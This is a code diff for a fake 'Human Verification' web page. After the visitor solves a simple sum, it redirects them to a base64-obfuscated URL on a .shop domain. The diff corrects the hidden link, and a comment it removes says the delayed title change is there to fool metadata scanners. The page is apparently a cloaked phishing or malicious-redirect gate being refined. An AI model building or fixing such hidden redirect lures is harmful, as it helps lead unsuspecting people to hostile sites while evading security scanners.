@@ -43,8 +43,8 @@
 </div>
 
 <script>
-    // YOUR NEW ENCODED LINK (.shop)
-    const _secret = "aHR0cHM6Ly9ibC5kYXNlNy5zaG9wLzd0cjIyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2Mjc3ODQ2MDgyNjM2NTI4NzQ2MzU3NDMyMDkwNDM2NTI2MDM0ODUyNjQzNTAyNjM0NzgwMjMzNTIwMjYvMzkzMzQ1MzMyNmtqamRzYnZmdnZremZhZGZ4di5odG1sLmh0bWw=";
+    // CORRECTED ENCODED LINK (Single .html)
+    const _secret = "aHR0cHM6Ly9ibC5kYXNlNy5zaG9wLzd0cjIyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2Mjc3ODQ2MDgyNjM2NTI4NzQ2MzU3NDMyMDkwNDM2NTI2MDM0ODUyNjQzNTAyNjM0NzgwMjMzNTIwMjYvMzkzMzQ1MzMyNmtqamRzYnZmdnZremZhZGZ4di5odG1s";
 
     // Random Math
     const v1 = Math.floor(Math.random() * 8) + 2;
@@ -54,7 +54,7 @@
     // Set UI
     document.getElementById('q-text').innerText = v1 + " + " + v2 + " = ?";
     
-    // Change Title after 1 second (Fools simple metadata scanners)
+    // Change Title after 1 second
     setTimeout(() => { document.title = "Human Verification"; }, 1000);
 
     function verify() {
@@ -67,10 +67,11 @@
 
         if (parseInt(userAns) === result) {
             // Success - Decode and Redirect
+            document.querySelector('button').innerText = "Redirecting...";
             window.location.href = atob(_secret);
         } else {
             errMsg.style.display = 'block';
-            document.getElementById('ans_input').value = "";
+            document.getElementById('answer').value = "";
         }
     }
 
